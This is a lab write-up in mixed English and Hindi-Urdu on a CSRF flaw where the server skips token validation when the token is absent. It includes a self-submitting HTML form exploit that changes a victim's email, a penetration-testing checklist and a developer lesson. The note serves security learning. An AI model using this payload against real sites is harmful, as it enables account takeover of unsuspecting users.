# 🔐 CSRF Lab: Token Validation Depends on Token Being Present

## 🧠 Lab Concept Overview

This lab demonstrates a flawed CSRF protection mechanism where the **server checks the CSRF token only if it is present in the request**. If the token is **missing**, the server skips validation and still processes the request. This results in a **CSRF vulnerability**.

---

## 📌 Real World Analogy:

Imagine a security guard who checks your ID only if you hand one over. But if you walk past without showing anything, he just assumes you're allowed to enter. This is exactly what this server is doing.

---

## 🔎 Why This Is a Problem

* CSRF token ka purpose hota hai **unauthorized request** ko rokna.
* Agar token **galat ho** to request reject hoti hai.
* Lekin agar token **missing ho**, aur server usse **ignore karke request accept kar le**, to **attack possible ho jata hai**.

---

## ⚔️ CSRF Attack Strategy (as shown in lab)

### ✅ 1. Observe normal behavior:

Submit a POST request to change the email address. You’ll see:

```txt
email=new@domain.com&csrf=VALID_TOKEN
```

If token is invalid ⇒ request is rejected.

### ✅ 2. Try sending request **without csrf token**:

```txt
email=new@domain.com
```

➡️ Request is accepted — THIS IS THE VULNERABILITY

### ✅ 3. Exploit Using HTML Form:

```html
<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
  <input type="hidden" name="email" value="csrfattack@exploit.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

### ✅ 4. Host it on exploit server, then deliver it to the victim.

---

## 💥 Real World Scenario — Kya aaj kal aisa hota hai?

Yes — CSRF still exists in real-world apps **especially in legacy systems**, or in:

* Apps with custom CSRF implementations
* Sites using partial frameworks
* Sites missing token enforcement logic in **all request types (GET, POST, etc.)**

**Recent Bug Bounty programs** have reported such logic flaws, proving this is not just theoretical.

---

## 🔍 As a Penetration Tester — Tumhein kya karna hoga?

### ✅ Step-by-Step Testing Strategy:

1. **Find CSRF protected forms** (change email, password, settings)
2. Intercept request in Burp Suite
3. Check if CSRF token is present in body/headers/cookies
4. Remove or tamper with token:

   * Send invalid token → should be rejected
   * Remove token completely → **does it still get accepted?**
5. Try sending GET request instead of POST
6. If accepted → vulnerable

### 🧰 Tools to Use:

* Burp Suite (Proxy, Repeater, Intruder)
* Firefox DevTools / Chrome DevTools
* Custom HTML exploit builder

---

## 🚫 Developer Lesson:

* Token hona chahiye + verify bhi hona chahiye
* Don't just check `if (csrf)`, use full validation
* CSRF middleware in frameworks like Django, Laravel, etc., should be enabled

---

## 🧠 Teri Zuban Mein Summary:

> “Yeh lab batata hai ke agar server sirf token ke hone pe validation kare — lekin uski value verify na kare — to attacker request se token hata ke email change karwa sakta hai. Aise bugs aaj bhi milte hain aur penetration testing mein aise logic flaws pe dhyan dena zaroori hai.”

---

## ✅ Suggested GitHub Note Title:

**"CSRF Vulnerability: Token Present Ho Tabhi Validate Hota Hai — Logic Flaw Explained"**

Ya

**"CSRF Token Bypass by Absence – Modern Logic Flaw for Pentesters"**
